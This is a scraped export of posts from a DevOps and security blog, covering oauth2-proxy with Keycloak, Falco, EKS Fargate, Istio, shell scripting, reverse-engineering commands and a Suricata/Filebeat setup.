https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt;/protocol/openid-connect/auth 14 redeemURL: https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt;/protocol/openid-connect/token 15 profileURL: https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt;/protocol/openid-connect/userinfo 16 validateURL: https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt;/protocol/openid-connect/userinfo 17 scope: \u0026#34;openid email profile groups\u0026#34; 18 allowedGroups: 19 - admins # List all groups managed at our your IdP which should be allowed access 20 # - infrateam 21 # - anothergroup 22 oidcConfig: 23 emailClaim: email. # Name of the clain in JWT containing the E-Mail 24 groupsClaim: groups # Name of the claim in JWT containing the Groups 25 userIDClaim: email # Name of the claim in JWT containing the User ID 26 skipDiscovery: true # You can try using the well-knwon endpoint directly for auto discovery, here we won\u0026#39;t use it 27 issuerURL: https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt; 28 jwksURL: https://\u0026lt;keycloak-domain\u0026gt;/identity/auth/realms/\u0026lt;keycloak-realm\u0026gt;/protocol/openid-connect/certs 29 upstreamConfig: 30 upstreams: 31 - id: static_200 32 path: / 33 static: true 34 staticCode: 200 35 # Headers that should be added to responses from the proxy 36 injectResponseHeaders: # Send this headers in responses from oauth2-proxy 37 - name: X-Auth-Request-Preferred-Username 38 values: 39 - claim: preferred_username 40 - name: X-Auth-Request-Email 41 values: 42 - claim: email 43extraArgs: 44 cookie-secure: \u0026#34;false\u0026#34; 45 cookie-domain: \u0026#34;.example.com\u0026#34; # Replace with your base domain 46 cookie-samesite: lax 47 cookie-expire: 12h # How long our Cookie is valid 48 auth-logging: true # Enable / Disable auth logs 49 request-logging: true # Enable / Disable request logs 50 standard-logging: true # Enable / Disable the standart logs 51 show-debug-on-error: true # Disable in production setups 52 skip-provider-button: true # We only have one provider configured (Keycloak) 53 silence-ping-logging: true # Keeps our logs clean 54 whitelist-domain: \u0026#34;.example.com\u0026#34; # Replace with your base domain Integration the nginx ingress to authentication Add the annanotations to ingress resources 1nginx.ingress.kubernetes.io/auth-response-headers: Authorization 2nginx.ingress.kubernetes.io/auth-signin: \u0026#34;https://oauth2.int.testing.com/oauth2/start?rd=https://$host$request_uri\u0026#34; 3nginx.ingress.kubernetes.io/auth-url: https://oauth2.int.testing.com/oauth2/auth 4nginx.ingress.kubernetes.io/configuration-snippet: | 5 proxy_set_header X-Auth-Request-Redirect $request_uri; The oauth2-proxy config look like following this 1# strip the upstreams, the oauth2-proxy don\u0026#39;t proxy any upstreams, can as authentication backend only, through pass the `rd` parameters to redirect 2# when authorization is completed 3# upstreams=[\u0026#34;http://app.namespace:8080/\u0026#34;] 4whitelist_domains=[\u0026#34;.sufix.text.com\u0026#34;] 5cookie_domains=[\u0026#34;.sufix.text.com\u0026#34;] Reference resources (Oauth2-proxy config example)[https://github.com/oauth2-proxy/oauth2-proxy/blob/6cc7da8993cf81dc0aae475edfd1632fd74d7818/contrib/oauth2-proxy.cfg.example] (Official docs)[https://oauth2-proxy.github.io/oauth2-proxy/docs/] (integration the DEX identity)[https://github.com/dexidp/dex] (Single proxy multiple sub domain to authentication)[https://www.digitalocean.com/community/tutorials/how-to-protect-private-kubernetes-services-behind-a-github-login-with-oauth2_proxy] (OAuth from First Principles)[https://stack-auth.com/blog/oauth-from-first-principles] ","link":"https://blog.wisekee.com/post/use-oauth2-proxy/","section":"post","tags":["Authortication","OIDC","Cloud Native"],"title":"To defence the internal web or resources use Oauth2 proxy"},{"body":"","link":"https://blog.wisekee.com/tags/network/","section":"tags","tags":null,"title":"network"},{"body":" ossim tcpdump tshark wireshark Nmap skipfish security onion snort zeek openvas,Greenbone Community Edition backbox kali platform penetration testing and security assessmen zeltser Threats with ATT\u0026amp;CK-based Analytics threat hunting tools canarytokens security tools and parse events for most products open source, cross platform web application firewall (WAF) Coraza is a golang enterprise-grade Web Application Firewall framework About A collection of awesome framework, libraries, learning tutorials, videos, webcasts, technical resources and cool stuff about Security Orchestration, Automation and Response (SOAR). ","link":"https://blog.wisekee.com/post/opensource-security-tools/","section":"post","tags":["Security","Network"],"title":"Open source security tools for beginners"},{"body":"","link":"https://blog.wisekee.com/tags/falco/","section":"tags","tags":null,"title":"falco"},{"body":"Today, Cloud Native Security is more and more important. the Falco is sysdig open source cloud security tools.\nWe can install to independent host or kubernetes cluster Please reference previous post about basic and install falco: Change every independent machine hostname to a meaningful name 1hostnamectl set-hostname qa-performance-testing Change macro ignore the itself rules change the /etc/falco/falco_rules.yaml to exclude falco event when falco upgrade check the writable 1# add /etc/falco/._check_writable to not fd.name 2 - macro: write_etc_common 3 condition: \u0026gt; 4 and not fd.name in (/etc/container_environment.sh, /etc/container_environment.json, /etc/motd, /etc/motd.svc, /etc/falco/._check_writable) restart the falco service systemctl restart falco-bpf Custom compile the driver of kernel Reference the repo: pipeline to compile of github The driverkit to compile the module driverkit Or online search Falco driver search The driver-loader script driver-loader Amazon linux kernel devel rpm package mirror amazon linux devel rpm The tools for driver compile 1#!/usr/bin/env bash 2 3# compile the amazon linux2 kernel specification version for ebpf and kernel for falco 4docker run -v /var/run/docker.sock:/var/run/docker.sock -v /tmp/output:/falco/output -ti falcosecurity/driverkit:latest driverkit docker --kernelrelease 5.4.238-148.346.amzn2.x86_64 --target amazonlinux2 --output-module /falco/output/5.4.238-148.346.ko --output-probe /falco/output/5.4.238-148.346.o --kernelurls \u0026#34;http://52.45.193.166/mirrors/http/amazonlinux.us-east-1.amazonaws.com/amazon_linux_2/kernel-devel-5.4.238-148.346.amzn2.x86_64.rpm\u0026#34; --driverversion 4.0.0+driver The ubuntu linux kernel devel deb packages mirror ubuntu aws linux kernel 1 2# you can also view download the pages find other versions 3docker run -v /var/run/docker.sock:/var/run/docker.sock -v /tmp/:/tmp -ti --rm falcosecurity/driverkit:latest driverkit docker --kernelrelease 5.13.0-1022-aws --target ubuntu-aws --output-module /tmp/falco_ubuntu-aws_5.13.0-1022-aws_24.ko --output-probe /tmp/falco_ubuntu-aws_5.13.0-1022-aws_24.o --kernelurls \u0026#34;http://security.ubuntu.com/ubuntu/pool/main/l/linux-aws-5.13/linux-aws-5.13-headers-5.13.0-1022_5.13.0-1022.24~20.04.1_all.deb,http://security.ubuntu.com/ubuntu/pool/main/l/linux-aws-5.13/linux-headers-5.13.0-1022-aws_5.13.0-1022.24~20.04.1_amd64.deb\u0026#34; --driverversion 4.0.0+driver driverversion need reference driver libs you can use branch or tags or commitid to compile the probe May in host temp folder random named you can tree find 1├── snap-private-tmp 2│ └── snap.docker 3│ └── tmp 4│ └── output 5│ └── output 6│ ├── 5.4.238-148.346.ko 7│ ├── 5.4.238-148.346.o Use custom url to load the driver 1# set environment variable 2export DRIVERS_REPO=http://localhost:8080 3# the http serve the static file path like following 4# {WEB_ROOT}/4.0.0+driver/x86_64/*.o 5# loader program should access to : http://localhost:8080/4.0.0%2Bdriver/x86_64/falco_ubuntu-aws_5.13.0-1022-aws_24.o 6# load the driver 7falco-driver-loader bpf Get the falco helm chart package Independent install the falcosidekick component for recevie the event from other falco agent\n1# add the repo repository 2helm repo add falcosecurity https://falcosecurity.github.io/charts 3# pull the falcosidekick package 4helm pull falcosecurity/falcosidekick 5# ","link":"https://blog.wisekee.com/post/falco+falcosidekick+ui/","section":"post","tags":["security","cncf","falco"],"title":"Setting up falco+falcosidekick+ui in kubernetes cluster"},{"body":"For greater isolation and convenience, we can use farget as the run time environment for eks.\nCreate eks farget execute role named: AmazonEKSFargatePodExecutionRole the TrustPolicy statements like following 1# trust policy 2{ 3 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 4 \u0026#34;Statement\u0026#34;: [ 5 { 6 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 7 \u0026#34;Principal\u0026#34;: { 8 \u0026#34;Service\u0026#34;: [ 9 \u0026#34;ssm.amazonaws.com\u0026#34;, 10 \u0026#34;eks-fargate-pods.amazonaws.com\u0026#34; 11 ] 12 }, 13 \u0026#34;Action\u0026#34;: \u0026#34;sts:AssumeRole\u0026#34;, 14 \u0026#34;Condition\u0026#34;: { 15 \u0026#34;ArnLike\u0026#34;: { 16 \u0026#34;aws:SourceArn\u0026#34;: \u0026#34;arn:aws:eks:us-east-1:{accountId}:fargateprofile/{clusterName}/*\u0026#34; 17 } 18 } 19 } 20 ] 21} attach the AWS managed policy to farget execution Role AmazonEKSClusterPolicy AmazonEKSFargatePodExecutionRolePolicy Create EKS farget profile in eks console select eks cluster and navigate the compute tab. and config farget profile to add new item\nselect farget pod execution role specific the namespace and prefer to label for pod selector label for: placed: farget the namespace can \u0026lsquo;*\u0026rsquo; for all namespaces Test the pod place to farget 1apiVersion: v1 2kind: Pod 3metadata: 4 name: test-farget-pod 5 generateName: test-farget-pod 6 namespace: test-farget 7 labels: 8 placed: farget 9spec: 10 containers: 11 - name: nginx 12 image: \u0026gt;- 13 nginx:latest 14 ports: 15 - name: http-80 16 containerPort: 80 17 protocol: TCP Setting up the logs the EKS farget logs can collect to cloudwatch and other tools use fluentbit configurations first create aws-observability namespace and apply aws-logging configmap\nthe namesapce config 1kind: Namespace 2apiVersion: v1 3metadata: 4 name: aws-observability 5 labels: 6 aws-observability: enabled the logs configmap object 1kind: ConfigMap 2apiVersion: v1 3metadata: 4 name: aws-logging 5 namespace: aws-observability 6data: 7 flb_log_cw: \u0026#34;false\u0026#34; # Set to true to ship Fluent Bit process logs to CloudWatch. 8 filters.conf: | 9 [FILTER] 10 Name parser 11 Match * 12 Key_name log 13 Parser crio 14 [FILTER] 15 Name kubernetes 16 Match kube.* 17 Merge_Log On 18 Keep_Log Off 19 Buffer_Size 0 20 Kube_Meta_Cache_TTL 300s 21 output.conf: | 22 [OUTPUT] 23 Name cloudwatch_logs 24 Match kube.* 25 region region-code 26 log_group_name my-logs 27 log_stream_prefix from-fluent-bit- 28 log_retention_days 60 29 auto_create_group true 30 parsers.conf: | 31 [PARSER] 32 Name crio 33 Format Regex 34 Regex ^(?\u0026lt;time\u0026gt;[^ ]+) (?\u0026lt;stream\u0026gt;stdout|stderr) (?\u0026lt;logtag\u0026gt;P|F) (?\u0026lt;log\u0026gt;.*)$ 35 Time_Key time 36 Time_Format %Y-%m-%dT%H:%M:%S.%L%z ","link":"https://blog.wisekee.com/post/aws-eks-farget-nodes/","section":"post","tags":["EKS","AWS","farget"],"title":"AWS EKS use farget nodes as pod runtime environments"},{"body":"Create eks node group label and taint 1labels = { 2 \u0026#34;node-group\u0026#34; : \u0026#34;spotInstances\u0026#34; 3} 4taints = [ 5 { 6 effect = \u0026#34;NO_SCHEDULE\u0026#34; 7 key = \u0026#34;devops\u0026#34; 8 value = \u0026#34;forceSchedule\u0026#34; 9 } 10] Create priorityClass one to placeholder other one to nornal schedule 1apiVersion: scheduling.k8s.io/v1 2kind: PriorityClass 3metadata: 4 name: placeholder 5value: 0 6preemptionPolicy: Never 7globalDefault: false 8description: \u0026#39;placeholder\u0026#39; 9--- 10apiVersion: scheduling.k8s.io/v1 11kind: PriorityClass 12metadata: 13 name: normal 14value: 1 15preemptionPolicy: Never 16globalDefault: true # default 17description: \u0026#39;normal\u0026#39; Use placeholde deployment 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: placeholder 5spec: 6 replicas: 1 # how many placeholder node should launch 7 selector: 8 matchLabels: 9 app: placeholder 10 template: 11 metadata: 12 labels: 13 app: placeholder 14 spec: 15 terminationGracePeriodSeconds: 0 # important 16 priorityClassName: placeholder # important 17 containers: 18 - image: nginx:1.23.1-alpine 19 name: placeholder 20 resources: 21 requests: 22 cpu: 3500m # this will use almost cpu 23 affinity: 24 nodeAffinity: 25 requiredDuringSchedulingIgnoredDuringExecution: 26 nodeSelectorTerms: 27 - matchExpressions: 28 - key: node-group 29 operator: In 30 values: 31 - spotInstances 32 tolerations: 33 - key: \u0026#34;devops\u0026#34; 34 operator: \u0026#34;Equal\u0026#34; 35 value: \u0026#34;forceSchedule\u0026#34; 36 effect: \u0026#34;NoSchedule\u0026#34; Schedule the pod to placeholde node and evict the placholder pod and launch new placehole node 1apiVersion: v1 2kind: Pod 3spec: 4 affinity: 5 priorityClassName: normal 6 nodeAffinity: 7 requiredDuringSchedulingIgnoredDuringExecution: 8 nodeSelectorTerms: 9 - matchExpressions: 10 - key: node-group 11 operator: In 12 values: 13 - spotInstances 14 tolerations: 15 - key: \u0026#34;devops\u0026#34; 16 operator: \u0026#34;Equal\u0026#34; 17 value: \u0026#34;forceSchedule\u0026#34; 18 effect: \u0026#34;NoSchedule\u0026#34; Reference Cluster overprovisioning in Kubernetes intended to be add overprovisioning to an autoscaling k8s cluster. Cluster Over-Provisioning ","link":"https://blog.wisekee.com/post/aws-eks-placeholde-nodes/","section":"post","tags":["EKS","kubernetes"],"title":"EKS nodes speed workloads launch time use placeholde free one node"},{"body":"","link":"https://blog.wisekee.com/tags/farget/","section":"tags","tags":null,"title":"farget"},{"body":"Sometimes intercept external access traffic in mesh to internal service is needed\nHttp to Internal service when access external domain in mesh network when access http://edition.cnn.com in mesh network then should redirect to hello.test-ns.svc.cluster.local internal service.\nCreate a ServiceEntry resource to defination the external domain entry 1apiVersion: networking.istio.io/v1alpha3 2kind: ServiceEntry 3metadata: 4 name: redirect-cnn-to-internal 5 namespace: test-ns 6spec: 7 hosts: 8 - edition.cnn.com 9 ports: 10 - number: 80 11 name: http 12 protocol: HTTP 13 - number: 443 14 name: https 15 protocol: HTTPS 16 resolution: NONE Create a VirtualService to serve target traffic 1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: redirect-cnn-to-internal 5 namespace: test-ns 6spec: 7 gateways: 8 - mesh 9 hosts: 10 - edition.cnn.com 11 http: 12 - name: all-traffic-to-internal-hello 13 route: 14 - destination: 15 host: \u0026gt;- 16 hello.test-ns.svc.cluster.local 17 port: 18 number: 80 You can also set the destination rule for timeout 1apiVersion: networking.istio.io/v1alpha3 2kind: DestinationRule 3metadata: 4 name: hello-test-ns-dr 5spec: 6 host: hello.test-ns.svc.cluster.local 7 trafficPolicy: 8 connectionPool: 9 tcp: 10 connectTimeout: 1s You can Injection the fault 5 second delay for 1 out of every 1000 requests\n1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: hello-test-inject-fault 5spec: 6 gateways: 7 - mesh 8 hosts: 9 - edition.cnn.com 10 http: 11 - fault: 12 delay: 13 percentage: 14 value: 0.1 15 fixedDelay: 5s 16 route: 17 - destination: 18 host: \u0026gt;- 19 hello.test-ns.svc.cluster.local Also redirect to external services immediate define the external service entry\n1apiVersion: networking.istio.io/v1beta1 2kind: ServiceEntry 3metadata: 4 name: google 5 namespace: istio-system 6spec: 7 hosts: 8 - google.com 9 location: MESH_EXTERNAL 10 ports: 11 - number: 443 12 name: https 13 protocol: TLS 14 resolution: DNS and define the destination rule\n1apiVersion: networking.istio.io/v1beta1 2kind: DestinationRule 3metadata: 4 name: google 5 namespace: istio-system 6spec: 7 host: \u0026#34;google.com\u0026#34; 8 trafficPolicy: 9 tls: 10 mode: SIMPLE connect to gateway and ingress traffic\n1route: 2- destination: 3 host: google.com 4 port: 5 number: 443 Repaired the aws MetaDataV2 403 failed in EKS pods 1--- 2apiVersion: networking.istio.io/v1beta1 3kind: ServiceEntry 4metadata: 5 name: aws-metadata 6 namespace: istio-system 7spec: 8 hosts: 9 - aws.metadata.internal 10 location: MESH_EXTERNAL 11 addresses: 12 - 169.254.169.254 13 ports: 14 - number: 80 15 name: tcp-80 16 protocol: tcp 17 - number: 443 18 name: tcp-443 19 protocol: tcp 20 21 resolution: STATIC 22 endpoints: 23 - address: 169.254.169.254 ","link":"https://blog.wisekee.com/post/istio-intecept-particular-traffic/","section":"post","tags":["Istio","ServiceEntry","Cloud Native"],"title":"Istio intercept particular traffic"},{"body":"","link":"https://blog.wisekee.com/tags/serviceentry/","section":"tags","tags":null,"title":"ServiceEntry"},{"body":"Installation and Configuration istio use terraform\nPull helm chats to local 1# add istio helm chat repo url 2helm repo add istio https://istio-release.storage.googleapis.com/charts 3# download latest helm chat packages 4helm pull istio/base 5helm pull istio/istiod 6helm pull istio/gateway 7 8# uncompress to relative directory 9tar -xzvf base-1.17.1.tgz 10tar -xzvf istiod-1.17.1.tgz 11tar -xzvf gateway-1.17.1.tgz 12 13# move the istio components to prefer directory 14mv base ~/code/chats/istio-base 15mv istiod ~/code/chats/istiod 16mv gateway ~/code/chats/istio-gateway Create the istio namespace and initialization the base resources 1resource \u0026#34;kubernetes_namespace\u0026#34; \u0026#34;istio_system\u0026#34; { 2 metadata { 3 annotations = { 4 name = \u0026#34;istio-system\u0026#34; 5 } 6 labels = { 7 \u0026#34;kubesphere.io/namespace\u0026#34; = \u0026#34;istio-system\u0026#34; 8 \u0026#34;kiali.io/member-of\u0026#34; = \u0026#34;istio-system\u0026#34; 9 } 10 name = \u0026#34;istio-system\u0026#34; 11 } 12} 13 14resource \u0026#34;helm_release\u0026#34; \u0026#34;istio_base\u0026#34; { 15 name = \u0026#34;istio-base\u0026#34; 16 chart = \u0026#34;~/code/charts/istio-base\u0026#34; 17 namespace = kubernetes_namespace.istio_system.metadata.0.name 18 19 values = [ 20 \u0026lt;\u0026lt;-EOF 21 global: 22 istiod: 23 enableAnalysis: true 24 EOF 25 ] 26} Initialization the istiod control plane Use custom docker registry in local and send tracing data to signoz open source OTEL product,include the logs, metrics and trace data\n1resource \u0026#34;helm_release\u0026#34; \u0026#34;istiod\u0026#34; { 2 name = \u0026#34;istiod\u0026#34; 3 chart = \u0026#34;~/code/charts/istiod\u0026#34; 4 namespace = kubernetes_namespace.istio_system.metadata.0.name 5 6 values = [ 7 \u0026lt;\u0026lt;-EOF 8 pilot: 9 hub: \u0026#34;docker.myregistry.me/istio\u0026#34; 10 tag: \u0026#34;1.17.1\u0026#34; 11 global: 12 hub: \u0026#34;docker.myregistry.me/istio\u0026#34; 13 tag: \u0026#34;1.17.1\u0026#34; 14 telemetry: 15 enabled: true 16 v2: 17 prometheus: 18 enabled: true 19 meshConfig: 20 enableTracing: true 21 enablePrometheusMerge: true 22 accessLogEncoding: JSON 23 defaultConfig: 24 tracing: 25 sampling: 100.00 26 zipkin: 27 address: \u0026#34;signoz-otel-collector.signoz.svc.cluster.local:9411\u0026#34; 28 customTags: 29 service.name: 30 environment: 31 name: ISTIO_META_WORKLOAD_NAME 32 33 extensionProviders: 34 - name: otel 35 envoyOtelAls: 36 service: signoz-otel-collector.signoz.svc.cluster.local 37 port: 4317 38 - name: zipkin 39 zipkin: 40 service: \u0026#34;signoz-otel-collector.signoz.svc.cluster.local\u0026#34; 41 port: 9411 42 defaultProviders: 43 accessLogging: 44 - envoy 45 - otel 46 47 EOF 48 ] 49} Use annotations to config istio for indiviual pod 1annotations: 2 ... 3 proxy.istio.io/config: | 4 tracing: 5 sampling: 10 6 custom_tags: 7 my_tag_header: 8 header: 9 name: host Can also use istioctl command view and operator Envoy proxy details 1istioctl proxy-status 2istioctl proxy-status details-v1-6dcc6fbb9d-wsjz4.default 3# Deep dive into Envoy configuration 4istioctl proxy-config cluster -n istio-system istio-ingressgateway-7d6874b48f-qxhn5 5 istioctl proxy-config bootstrap -n istio-system istio-ingressgateway-7d6874b48f-qxhn5 6istioctl proxy-config listeners productpage-v1-6c886ff494-7vxhs Istio config default the ConfigMap istio-sidecar-injector Exactly proxy resource request and limit 1spec: 2 template: 3 metadata: 4 annotations: 5 sidecar.istio.io/proxyCPU: \u0026#34;200m\u0026#34; 6 sidecar.istio.io/proxyMemoryLimit: \u0026#34;5Gi\u0026#34; Create ServiceEntry for external traffic adds the ext-svc.example.com external dependency to Istio’s service registry\n1apiVersion: networking.istio.io/v1alpha3 2kind: ServiceEntry 3metadata: 4 name: svc-entry 5spec: 6 hosts: 7 - ext-svc.example.com 8 ports: 9 - number: 443 10 name: https 11 protocol: HTTPS 12 location: MESH_EXTERNAL 13 resolution: DNS Create DestinationRule resource DestinationRule main specific\ntrafficPolicy mTLS versions to app 1apiVersion: networking.istio.io/v1alpha3 2kind: DestinationRule 3metadata: 4 name: my-destination-rule 5spec: 6 host: my-svc 7 trafficPolicy: 8 loadBalancer: 9 simple: RANDOM 10 subsets: 11 #### This will work only if we have defined version label in the deployment 12 - name: v1 13 labels: 14 version: v1 15 - name: v2 16 labels: 17 version: v2 18 trafficPolicy: 19 loadBalancer: 20 simple: ROUND_ROBIN 21 - name: v3 22 labels: 23 version: v3 Create VirtualService resource virtualService include some functional\ntimeout url prefix match redirect directResponse delegate rewrite http url retries fault traffic mirror corsPolicy set request header and response header 1apiVersion: networking.istio.io/v1alpha3 2kind: VirtualService 3metadata: 4 name: gateway-proxy 5 namespace: kong 6spec: 7 hosts: 8 - gateway-v2.homepartners.dev 9 gateways: 10 - istio-system/istio-external-gateway 11 http: 12 - name: gateway-proxy 13 # match: 14 # - uri: 15 # prefix: \u0026#34;/*\u0026#34; 16 timeout: 5s 17 route: 18 - destination: 19 host: gateway-proxy.kong.svc.cluster.local 20 port: 21 number: 80 More case learn can view github samples ","link":"https://blog.wisekee.com/post/install_istio_helm_chat/","section":"post","tags":["Istio","Terraform","Cloud Native"],"title":"Installation and configuration istio use helm chat and terraform"},{"body":"The link list to learn shell script in production practice github-install-go-release-cmd falco-install-script curl https://meshery.io/install various os guideline The AWS SSM Document has many script to learn helm secrets script BASH Programming - Introduction HOW-TO Advanced Bash-Scripting Guide Variable assign relative 1# sets SOMETHING to value if it isn\u0026#39;t already set, and evlate the value to execute, to avoid use this 2${SOMETHING=\u0026#39;value\u0026#39;} 3# If parameter not set, use default. 4${parameter-default}, ${parameter:-default} Colorize the output 1print_green() { 2 BOLD_GREEN=$(tput bold ; tput setaf 2) 3 NORMAL=$(tput sgr0) 4 echo \u0026#34;${BOLD_GREEN}$1${NORMAL}\u0026#34; 5} 6 7print_yellow() { 8 BOLD_YELLOW=$(tput bold ; tput setaf 3) 9 NORMAL=$(tput sgr0) 10 echo \u0026#34;${BOLD_YELLOW}$1${NORMAL}\u0026#34; 11} 12 13print_red() { 14 BOLD_YELLOW=$(tput bold ; tput setaf 1) 15 NORMAL=$(tput sgr0) 16 echo \u0026#34;${BOLD_YELLOW}$1${NORMAL}\u0026#34; 17} 18 19print_blue() { 20 BOLD_YELLOW=$(tput bold ; tput setaf 4) 21 NORMAL=$(tput sgr0) 22 echo \u0026#34;${BOLD_YELLOW}$1${NORMAL}\u0026#34; 23} Chooise the menu for aws login 1# Set a prompt for user input 2PS3=\u0026#39;Please enter your choice:\u0026#39; 3 4# Define the available options 5options=(\u0026#34;dev\u0026#34; \u0026#34;uat\u0026#34; \u0026#34;prod\u0026#34;) 6default_select=\u0026#34;dev\u0026#34; 7 8# Ask for user input 9select opt in \u0026#34;${options[@]}\u0026#34; \u0026#34;quit\u0026#34;; do 10 case \u0026#34;$REPLY\u0026#34; in 11 [1-3]) 12 echo \u0026#34;You select $opt environment\u0026#34; 13 default_select=$opt; break;; 14 $((${#options[@]}+1))) 15 echo \u0026#34;Goodbye!\u0026#34;; exit 0;; 16 *) 17 echo \u0026#34;Anythins not choice.\u0026#34;; continue;; 18 esac 19done 20 21# Set the default profile 22export AWS_PROFILE=\u0026#34;${default_select}\u0026#34; 23 24# Login to AWS with the default profile 25echo \u0026#34;SSO login to aws use ${default_select} profile!\u0026#34; 26aws sso login --profile $default_select 27echo \u0026#34;You can exec: export AWS_PROFILE=\\\u0026#34;${default_select}\\\u0026#34;\u0026#34; Execution the cleanup when shell script exit 1#!/bin/sh -e 2cleanup() { 3 rm -f \u0026#39;/var/folders/r2/dqq64b157nz7nz_xtxfy33s80000gn/T/xxxxx-open-terminal_A99E78E2.sh\u0026#39; 4} 5trap cleanup EXIT 6\u0026#39;/Applications/xxxxx.app/Contents/MacOS/bin/xxxxxx\u0026#39; \u0026#39;-m\u0026#39; \u0026#39;ubuntu\u0026#39; when exec /var/folders/r2/dqq64b157nz7nz_xtxfy33s80000gn/T/xxxxx-open-terminal_A99E78E2.sh; exit will delete script self Dynamic add cron schedule in linux 1echo \u0026#34;0 0 * * * docker system prune -a -f\u0026#34; \u0026gt;\u0026gt; /var/spool/cron/crontabs/root 2sudo chmod +x /var/spool/cron/crontabs/root 3echo \u0026#34;*/30 * * * * aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin xxxxxxx.dkr.ecr.us-east-1.amazonaws.com\u0026#34; \u0026gt;\u0026gt; /var/spool/cron/crontabs/root Run the docker tutorial 101 in localhost 1docker run -dp 0.0.0.0:8000:80 docker/getting-started:pwd Extract the sub string use shell script 1# use the cut command 2imageName=$(echo ${{ matrix.images }} | cut -d \u0026#39;:\u0026#39; -f1) 3current_tag=$(echo ${{ matrix.images }} | cut -d \u0026#39;:\u0026#39; -f2) 4 5# use the awk command 6major=$(echo $current_tag | awk -F. \u0026#39;{print $1}\u0026#39;) 7minor=$(echo $current_tag | awk -F. \u0026#39;{print $2}\u0026#39;) 8patch=$(echo $current_tag | awk -F. \u0026#39;{print $3}\u0026#39;) 9((patch++)) 10 11# use parameter expand 12# replace all colon to dash 13JSON_FILE_NAME=${JSON_FILE_NAME//:/-} 14# split the IMAGE variable dlimit / and extract the last section 15JSON_FILE_NAME=${IMAGE##*/} Read a file 1while read line 2do 3 echo $line 4done \u0026lt; input.txt The condition statement 1#!/bin/bash 2 3echo \u0026#34;Please enter a number: \u0026#34; 4read num 5 6if [ $num -gt 0 ]; then 7 echo \u0026#34;$num is positive\u0026#34; 8elif [ $num -lt 0 ]; then 9 echo \u0026#34;$num is negative\u0026#34; 10else 11 echo \u0026#34;$num is zero\u0026#34; 12fi The loop statement 1#!/bin/bash 2i=1 3while [[ $i -le 10 ]] ; do 4 echo \u0026#34;$i\u0026#34; 5 (( i += 1 )) 6done The cron script Schedule Description\tExample 0 0 Run a script at midnight every day\t0 0 /path/to/script.sh /5 Run a script every 5 minutes\t/5 /path/to/script.sh 0 6 1-5 Run a script at 6 am from Monday to Friday\t0 6 1-5 /path/to/script.sh 0 0 1-7 Run a script on the first 7 days of every month\t0 0 1-7 /path/to/script.sh 0 12 1 Run a script on the first day of every month at noon\t0 12 1 /path/to/script.sh Reference 1000+ DevOps Bash Scripts AWS EKS packer scripts consider starting bash scripts with these options gitlab runner bash scripts Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash 6 Techniques I Use to Create a Great User Experience for Shell Scripts Linux from scratch Command line reference for all OS ","link":"https://blog.wisekee.com/post/excellent-shell-script/","section":"post","tags":["script","open source","shell"],"title":"Getting started shell script in production from example"},{"body":"","link":"https://blog.wisekee.com/tags/reverse/","section":"tags","tags":null,"title":"Reverse"},{"body":"Reverse engineering can be used for different goals, such as finding malware, discovering vulnerabilities, fixing software bugs, testing compatibility, and protecting intellectual property.\nAbstractor Application Binary Interface (ABI) Reverse tools Ghidra: free and open-source software reverse engineering suite made by the NSA and released to the public in 2019 github IDA Pro: commercial interactive disassembler and debugger made by Hex-Rays and widely used by security experts and professionals. How to check the binary format inform 1# you can view the program format and linked information 2file xxxxx 3# view the detail elf 4readelf -a xxxxx 5# to detect the dynamic libraries be used 6ldd xxxxx 7# view the header details 8hexdump -C -n 64 xxxxx 9 10# view the binary file objects 11objdump -t hello 12 13objdump -h hello 14 15objdump -f hello Some command to view headers dumpelf elfls -p /bin/ps eu-readelf –section-headers /bin/ps readelf -S /bin/ps objdump -h /bin/ps Posts series about knowledge ELF Format and Runtime Internals\nlearning-linux-binary\nHopper Disassembler\nGhidra is a software reverse engineering\nGhidra script\nthe Ultimate Packer for eXecutables\nA Simple ELF\n","link":"https://blog.wisekee.com/post/reverse-enginerring-getting-started/","section":"post","tags":["Reverse","Security"],"title":"Reverse enginerring getting started"},{"body":"","link":"https://blog.wisekee.com/tags/script/","section":"tags","tags":null,"title":"script"},{"body":"","link":"https://blog.wisekee.com/tags/shell/","section":"tags","tags":null,"title":"shell"},{"body":"install Suricata in ubuntu instance 1sudo add-apt-repository ppa:oisf/suricata-stable 2sudo apt install suricata 3sudo systemctl enable suricata.service 4sudo systemctl stop suricata.service Config Suricata edit file sudo nano /etc/suricata/suricata.yaml\n1# enable/disable the community id feature. 2community-id: true 3# Linux high speed capture support 4af-packet: 5 - interface: eth0 6 # Number of receive threads. \u0026#34;auto\u0026#34; uses the number of cores 7 #threads: auto 8 # Default clusterid. AF_PACKET will load balance packets based on flow. 9 cluster-id: 99 10detect-engine: 11 - rule-reload: true Setup the suricata 1# reload config and restart 2sudo kill -usr2 $(pidof suricata) 3# determine the device name 4ip -p -j route show default 5# update rules 6sudo suricata-update 7# list sources 8sudo suricata-update list-sources 9# enable specific source 10sudo suricata-update enable-source tgreen/hunting 11# validation the config 12sudo suricata -T -c /etc/suricata/suricata.yaml -v 13# start service 14sudo systemctl start suricata.service 15# view status 16sudo systemctl status suricata.service 17# view logs 18sudo tail -f /var/log/suricata/suricata.log install filebeat to collect the suricata event to elasticsearch 1# add gpg key to system 2curl -fsSL https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - 3# add repo source to sources.list 4echo \u0026#34;deb https://artifacts.elastic.co/packages/7.x/apt stable main\u0026#34; | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list 5# install filebeat 6sudo apt update 7sudo apt install filebeat 8# edit filebeat file 9sudo nano /etc/filebeat/filebeat.yml 10# Edit filebeat.yml 1# setup.kibana url 2setup.kibana: 3 host: \u0026#34;your_kibana_ip:5601\u0026#34; 4output.elasticsearch: 5 hosts: 